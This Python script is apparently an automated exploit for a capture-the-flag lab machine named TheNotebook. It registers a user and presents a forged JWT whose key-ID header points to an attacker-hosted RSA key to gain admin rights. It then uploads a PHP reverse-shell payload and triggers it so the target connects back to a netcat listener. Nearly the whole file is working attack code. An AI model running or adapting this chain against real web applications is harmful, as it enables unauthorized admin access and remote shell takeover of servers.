import requests
import sys
import re

ip = "http://10.10.10.230/"
admin_directory = "admin"
registration_directory = "register"
login_directory = "login"

# Proxy if required
http_proxy = "http://127.0.0.1:8080"
proxyData = {
	"http" : http_proxy
}

def register(username, password, email):
	data = {
		"username" : username,
		"password" : password,
		"email" : email
	}

	reg_resp = requests.post(ip+registration_directory, data = data)
	return reg_resp

def login(username, password):
	data = {
		"username" : username,
		"password" : password
	}

	log_resp = requests.post(ip + login_directory, data=data)
	return log_resp

def access_admin(username, password, cookies):
	resp = requests.get(ip+admin_directory, cookies=cookies)
	return resp

def upload_payload(cookies):
	payload_file = open("revshell.php", "rb")
	
	resp = requests.post(ip+admin_directory+"/upload", cookies=cookies, files = {"file" : payload_file})
	return resp

def main():
	username = "norman"
	password = "test12"
	email = "norman@thenotebook.htb"

	print("[*] Registering user")
	resp = register(username, password, email)

	if "User already exists" in resp.text:
		print("[*] User already exists")
		print("[*] Logging In")

		resp = login(username, password)
		
	print("[*] Accessing Admin Page")
	hosted = input("[!] Hosted RSA private key on 8000 port on local machine (Y/n): ")
	if hosted == 'n' or hosted == 'N':
		print("[-] Can't login as admin")
		sys.exit(0)

	cookies = {
		"auth" : "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yMDc6ODAwMC9SU0EucHJpdiJ9.eyJ1c2VybmFtZSI6Im5vcm1hbiIsImVtYWlsIjoibm9ybWFuQHRoZW5vdGVib29rLmh0YiIsImFkbWluX2NhcCI6dHJ1ZX0.MdnOrz9lZu1Nho8vWA4MJYN6SM9RJcuu6P0Nhhl1FrfOonJA9FnnQJ-pyWlHDHSwzGIZ2yt4W3dp8O7iaiGFEdVyBFuZRtrtYnPMMfd0_-2KALflDZrO21x_DMlXGpHns0tIlt9YnqM-9shVtL3EmEiK0hOgQuakJTpH-shk-Lo"
	}

	resp = access_admin(username, password, cookies)
	if "Forbidden" in resp.text:
		print("[-] Can't login as admin")
	print("[+] Logged in as admin")

	nc_listener = input("[!] Netcat listening on port 9001 (Y/n): ")

	if nc_listener == 'n' or nc_listener == 'N':
		print("[-] Netcat not listening on portt 9001")
		sys.exit(0)
	
	print("[+] Uploading payload for reverse shell")

	resp = upload_payload(cookies)

	if "Upload Failed!" in resp.text:
		print("[-] Couldn't upload payload")
		sys.exit(0)

	print("[+] Executing payload. Ctrl + c to exit")
	
	regex = r"[a-zA-z0-9]*(.php)"

	payload_directory = re.search(regex, resp.text)
	

	try:
		resp = requests.get(ip + payload_directory.group(0), cookies=cookies)
		print(resp.url)
	except KeyboardInterrupt:
		print("[!] Exiting...")
		sys.exit(0)
	



if __name__ == '__main__':
	main()